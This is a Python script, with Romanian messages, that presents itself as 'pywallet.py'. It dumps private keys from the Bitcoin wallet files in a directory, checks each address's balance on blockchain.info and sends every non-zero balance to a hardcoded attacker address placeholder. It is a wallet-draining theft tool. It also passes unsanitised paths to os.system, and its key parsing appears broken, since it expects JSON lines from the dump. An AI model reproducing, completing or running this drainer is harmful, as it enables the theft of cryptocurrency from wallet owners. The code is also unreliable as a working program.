import requests
from bitcoinlib.wallets import Wallet
import os
import sys
import getopt
import json

MY_ADDRESS = "AICI_PUI_ADRESA_TA_BTC"

def get_balance(address):
    url = f"https://blockchain.info/q/addressbalance/{address}"
    r = requests.get(url)
    if r.ok:
        return int(r.text) / 1e8  # BTC
    return 0

def send_btc(private_key_wif, to_address, amount_btc):
    w = Wallet.create('tempwallet', keys=private_key_wif, network='bitcoin')
    tx = w.send_to(to_address, amount_btc, network='bitcoin')
    print("Tranzacție trimisă:", tx.txid)

def main(argv):
    dumpfile = ''
    datadir = ''
    
    try:
        opts, args = getopt.getopt(argv,"hd:",["dumpfile=","datadir="])
    except getopt.GetoptError:
        print('pywallet.py -d <datadir> --dumpwallet')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('pywallet.py -d <datadir> --dumpwallet')
            sys.exit()
        elif opt in ("-d", "--datadir"):
            datadir = arg
            
    if not os.path.isdir(datadir):
        print("Directorul specificat nu există.")
        sys.exit(2)
        
    wallet_files = [f for f in os.listdir(datadir) if f.endswith('.dat')]
    
    if not wallet_files:
        print("Nu au fost găsite fișiere de portofel în directorul specificat.")
        sys.exit(2)
        
    for wallet_file in wallet_files:
        wallet_path = os.path.join(datadir, wallet_file)
        print(f"Procesare fișier portofel: {wallet_path}")
        os.system(f"bitcoin-cli -datadir={datadir} -rpcuser=utilizator -rpcpassword=parola dumpwallet {wallet_path}.dump")
        
        with open(f"{wallet_path}.dump", "r") as f:
            for line in f:
                if line.startswith("#") or not line.strip():
                    continue
                try:
                    key_data = json.loads(line)
                    privkey = key_data.get("privkey")
                    if privkey:
                        address = key_data.get("address")
                        balance = get_balance(address)
                        print(f"Adresa {address} are {balance} BTC")
                        if balance > 0:
                            print(f"Trimit {balance} BTC către {MY_ADDRESS}")
                            send_btc(privkey, MY_ADDRESS, balance)
                except json.JSONDecodeError:
                    print("Eroare la decodarea liniei:", line)
                    continue

if __name__ == "__main__":
    main(sys.argv[1:])
    
pip install bitcoinlib requests